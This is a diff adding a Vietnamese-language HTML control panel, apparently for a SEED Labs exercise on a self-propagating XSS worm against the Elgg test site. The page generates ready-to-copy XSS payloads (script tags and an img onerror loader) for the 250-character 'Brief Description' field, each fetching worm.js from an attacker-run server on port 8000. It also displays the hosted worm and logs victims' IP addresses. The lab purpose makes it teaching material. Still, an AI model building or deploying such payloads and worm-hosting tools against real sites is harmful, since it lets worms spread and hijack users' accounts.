@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Worm Web Server — Port 8000</title>
+  <style>
+    :root {
+      --bg: #0f172a;
+      --panel: #1e293b;
+      --panel-border: #334155;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --accent: #38bdf8;
+      --success: #22c55e;
+      --warning: #f59e0b;
+      --code-bg: #090d16;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+    }
+    .container {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: 24px 20px 48px;
+    }
+    header {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      padding-bottom: 18px;
+      border-bottom: 1px solid var(--panel-border);
+      margin-bottom: 24px;
+    }
+    .title-group h1 {
+      margin: 0;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .title-group p {
+      margin: 4px 0 0;
+      color: var(--muted);
+      font-size: 0.92rem;
+    }
+    .badge-live {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(34, 197, 94, 0.14);
+      color: #4ade80;
+      border: 1px solid rgba(34, 197, 94, 0.35);
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+    .dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--success);
+      box-shadow: 0 0 8px var(--success);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+    @media (max-width: 900px) {
+      .grid { grid-template-columns: 1fr; }
+    }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--panel-border);
+      border-radius: 12px;
+      padding: 20px;
+    }
+    .card h2 {
+      margin: 0 0 14px;
+      font-size: 1.08rem;
+      color: var(--accent);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+    label {
+      display: block;
+      font-size: 0.84rem;
+      color: var(--muted);
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+    input, select {
+      width: 100%;
+      padding: 9px 12px;
+      border-radius: 8px;
+      border: 1px solid var(--panel-border);
+      background: #0f172a;
+      color: var(--text);
+      font-size: 0.92rem;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 9px 16px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 600;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: opacity 0.15s;
+    }
+    .btn:hover { opacity: 0.9; }
+    .btn-primary {
+      background: var(--accent);
+      color: #0f172a;
+    }
+    .btn-outline {
+      background: transparent;
+      color: var(--text);
+      border: 1px solid var(--panel-border);
+    }
+    .payload-box {
+      background: var(--code-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 12px;
+    }
+    .payload-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.82rem;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+    .payload-code {
+      font-family: Consolas, "Courier New", monospace;
+      font-size: 0.88rem;
+      color: #fde047;
+      word-break: break-all;
+      user-select: all;
+    }
+    .char-tag {
+      color: #4ade80;
+      font-weight: 600;
+    }
+    pre {
+      margin: 0;
+      background: var(--code-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 8px;
+      padding: 14px;
+      overflow-x: auto;
+      font-family: Consolas, "Courier New", monospace;
+      font-size: 0.84rem;
+      color: #e2e8f0;
+      max-height: 360px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.88rem;
+    }
+    th, td {
+      text-align: left;
+      padding: 9px 10px;
+      border-bottom: 1px solid var(--panel-border);
+    }
+    th {
+      color: var(--muted);
+      font-weight: 600;
+    }
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
+    .file-links {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="title-group">
+        <h1>🌐 Web Server Cá Nhân — Host File XSS Worm (`.js`)</h1>
+        <p>Phục vụ bài tập Self-Propagation XSS Worm trên trường <strong>Brief Description (tối đa 250 ký tự)</strong></p>
+      </div>
+      <div class="badge-live">
+        <span class="dot"></span>
+        <span>HTTP Server Đang Chạy (Port 8000)</span>
+      </div>
+    </header>
+
+    <div class="grid">
+      <!-- Cột 1: Cấu hình thông số worm.js -->
+      <div class="card">
+        <h2>
+          <span>1. Cấu hình tham số trong <code>worm.js</code></span>
+          <span id="save-status" style="font-size:0.82rem;color:#4ade80;"></span>
+        </h2>
+
+        <div class="form-row">
+          <div>
+            <label for="msv-input">Mã Sinh Viên (MSV hiển thị ở About me)</label>
+            <input id="msv-input" type="text" value="B21DCCNxxx" placeholder="VD: B21DCCN123">
+          </div>
+          <div>
+            <label for="guid-input">GUID tài khoản tấn công (Samy)</label>
+            <input id="guid-input" type="number" value="59">
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div>
+            <label for="ip-select">Địa chỉ IP Web Server (Port 8000)</label>
+            <select id="ip-select" onchange="updatePayloads()"></select>
+          </div>
+          <div>
+            <label for="target-input">Domain Web mục tiêu (Elgg)</label>
+            <input id="target-input" type="text" value="http://www.seed-server.com">
+          </div>
+        </div>
+
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:14px;">
+          <div class="file-links">
+            <a class="btn btn-outline" href="/worm.js" target="_blank">📄 Mở trực tiếp /worm.js</a>
+            <a class="btn btn-outline" href="/w.js" target="_blank">📄 Mở bản rút gọn /w.js</a>
+          </div>
+          <button class="btn btn-primary" onclick="saveWormConfig()">💾 Lưu & Cập nhật worm.js</button>
+        </div>
+      </div>
+
+      <!-- Cột 2: Payload chèn vào Brief Description (< 250 ký tự) -->
+      <div class="card">
+        <h2>2. Payload chèn vào trường Brief Description (&le; 250 ký tự)</h2>
+
+        <div class="payload-box">
+          <div class="payload-header">
+            <span>Cách 1: Thẻ <code>&lt;script&gt;</code> chuẩn</span>
+            <span>Độ dài: <span id="len-1" class="char-tag">0/250</span> — <a href="javascript:void(0)" onclick="copyText('p-1')">Sao chép</a></span>
+          </div>
+          <div id="p-1" class="payload-code"></div>
+        </div>
+
+        <div class="payload-box">
+          <div class="payload-header">
+            <span>Cách 2: Thẻ <code>&lt;script&gt;</code> siêu ngắn (dùng <code>/w.js</code>)</span>
+            <span>Độ dài: <span id="len-2" class="char-tag">0/250</span> — <a href="javascript:void(0)" onclick="copyText('p-2')">Sao chép</a></span>
+          </div>
+          <div id="p-2" class="payload-code"></div>
+        </div>
+
+        <div class="payload-box" style="margin-bottom:0;">
+          <div class="payload-header">
+            <span>Cách 3: Thẻ <code>&lt;img src=x onerror=...&gt;</code></span>
+            <span>Độ dài: <span id="len-3" class="char-tag">0/250</span> — <a href="javascript:void(0)" onclick="copyText('p-3')">Sao chép</a></span>
+          </div>
+          <div id="p-3" class="payload-code"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid">
+      <!-- Cột 3: Nội dung file worm.js đang được host -->
+      <div class="card">
+        <h2>
+          <span>3. Nội dung file <code>worm.js</code> đang host trên Server</span>
+          <span style="font-size:0.8rem;color:var(--muted);">UTF-8 Encoding</span>
+        </h2>
+        <pre id="worm-preview">Đang tải nội dung worm.js...</pre>
+      </div>
+
+      <!-- Cột 4: Nhật ký truy cập thực tế khi nạn nhân dính XSS -->
+      <div class="card">
+        <h2>
+          <span>4. Nhật ký truy cập Server (Real-time Access Logs)</span>
+          <button class="btn btn-outline" style="padding:4px 10px;font-size:0.78rem;" onclick="clearLogs()">Xóa log</button>
+        </h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Thời gian</th>
+              <th>IP Nạn nhân</th>
+              <th>Yêu cầu HTTP</th>
+            </tr>
+          </thead>
+          <tbody id="log-body">
+            <tr><td colspan="3" style="color:var(--muted);">Chưa có lượt tải nào...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let initializedIps = false;
+
+    function getSelectedBaseUrl() {
+      const select = document.getElementById("ip-select");
+      const ip = select.value || window.location.hostname || "192.168.231.1";
+      return `http://${ip}:8000`;
+    }
+
+    function updatePayloads() {
+      const base = getSelectedBaseUrl();
+      const p1 = `<script type="text/javascript" src="${base}/worm.js"><\/script>`;
+      const p2 = `<script src="${base}/w.js"><\/script>`;
+      const p3 = `<img src=x onerror="s=document.createElement('script');s.src='${base}/worm.js';document.body.appendChild(s)">`;
+
+      document.getElementById("p-1").textContent = p1;
+      document.getElementById("len-1").textContent = `${p1.length}/250 ký tự`;
+
+      document.getElementById("p-2").textContent = p2;
+      document.getElementById("len-2").textContent = `${p2.length}/250 ký tự`;
+
+      document.getElementById("p-3").textContent = p3;
+      document.getElementById("len-3").textContent = `${p3.length}/250 ký tự`;
+    }
+
+    function populateIps(ipList) {
+      if (initializedIps) return;
+      const select = document.getElementById("ip-select");
+      select.innerHTML = "";
+      const currentHost = window.location.hostname || "127.0.0.1";
+      const ips = (ipList && ipList.length) ? ipList : [currentHost, "127.0.0.1", "192.168.231.1"];
+      ips.forEach(ip => {
+        const opt = document.createElement("option");
+        opt.value = ip;
+        opt.textContent = `${ip}:8000`;
+        if (ip === currentHost || (currentHost === "localhost" && ip === "127.0.0.1")) {
+          opt.selected = true;
+        }
+        select.appendChild(opt);
+      });
+      initializedIps = true;
+      updatePayloads();
+    }
+
+    async function fetchStatus() {
+      try {
+        const res = await fetch("/api/status", { cache: "no-store" });
+        if (!res.ok) throw new Error("Fallback to static mode");
+        const data = await res.json();
+
+        if (!initializedIps) {
+          if (data.msv) document.getElementById("msv-input").value = data.msv;
+          if (data.samy_guid) document.getElementById("guid-input").value = data.samy_guid;
+          populateIps(data.ips);
+        }
+
+        if (data.worm_js) {
+          document.getElementById("worm-preview").textContent = data.worm_js;
+        }
+
+        const tbody = document.getElementById("log-body");
+        if (!data.logs || data.logs.length === 0) {
+          tbody.innerHTML = '<tr><td colspan="3" style="color:var(--muted);">Chưa có lượt truy cập nào...</td></tr>';
+        } else {
+          tbody.innerHTML = data.logs.map(item => `
+            <tr>
+              <td>${item.time}</td>
+              <td><code>${item.ip}</code></td>
+              <td><strong style="color:#38bdf8;">${item.method} ${item.path}</strong></td>
+            </tr>
+          `).join("");
+        }
+      } catch (e) {
+        const firstLoad = !initializedIps;
+        populateIps(null);
+        const res = await fetch(`/worm.js?t=${Date.now()}`, { cache: "no-store" });
+        if (res.ok) {
+          const buf = await res.arrayBuffer();
+          const text = new TextDecoder("utf-8").decode(buf);
+          document.getElementById("worm-preview").textContent = text;
+          if (firstLoad) {
+            const msvMatch = text.match(/var\s+MSV\s*=\s*["']([^"']*)["']/);
+            const guidMatch = text.match(/var\s+samyGuid\s*=\s*(\d+)/);
+            if (msvMatch) document.getElementById("msv-input").value = msvMatch[1];
+            if (guidMatch) document.getElementById("guid-input").value = guidMatch[1];
+          }
+        }
+      }
+    }
+
+    async function saveWormConfig() {
+      const msv = document.getElementById("msv-input").value.trim() || "23001925";
+      const samy_guid = parseInt(document.getElementById("guid-input").value, 10) || 59;
+      const server_url = `${getSelectedBaseUrl()}/worm.js`;
+      const target_domain = document.getElementById("target-input").value.trim() || "http://www.seed-server.com";
+      const status = document.getElementById("save-status");
+
+      try {
+        const res = await fetch("/api/update-worm", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ msv, samy_guid, server_url, target_domain })
+        });
+        if (res.ok) {
+          const data = await res.json();
+          document.getElementById("worm-preview").textContent = data.worm_js;
+          status.textContent = "✓ Đã cập nhật worm.js!";
+          setTimeout(() => { status.textContent = ""; }, 2500);
+          return;
+        }
+      } catch (err) {}
+
+      // Chế độ chạy bằng python -m http.server 8000 thuần: tải lại trực tiếp từ file worm.js trên ổ đĩa
+      await fetchStatus();
+      const previewEl = document.getElementById("worm-preview");
+      previewEl.textContent = previewEl.textContent
+        .replace(/var\s+MSV\s*=\s*["'][^"']*["']\s*;/, `var MSV = "${msv}";`)
+        .replace(/var\s+samyGuid\s*=\s*\d+\s*;/, `var samyGuid = ${samy_guid};`);
+      status.textContent = "✓ Đã đồng bộ tham số!";
+      setTimeout(() => { status.textContent = ""; }, 2500);
+    }
+
+    async function clearLogs() {
+      await fetch("/api/clear-logs", { method: "POST" });
+      fetchStatus();
+    }
+
+    function copyText(id) {
+      const text = document.getElementById(id).textContent;
+      navigator.clipboard.writeText(text);
+      const status = document.getElementById("save-status");
+      status.textContent = "✓ Đã sao chép payload!";
+      setTimeout(() => { status.textContent = ""; }, 2000);
+    }
+
+    fetchStatus();
+    setInterval(fetchStatus, 2000);
+  </script>
+</body>
+</html>
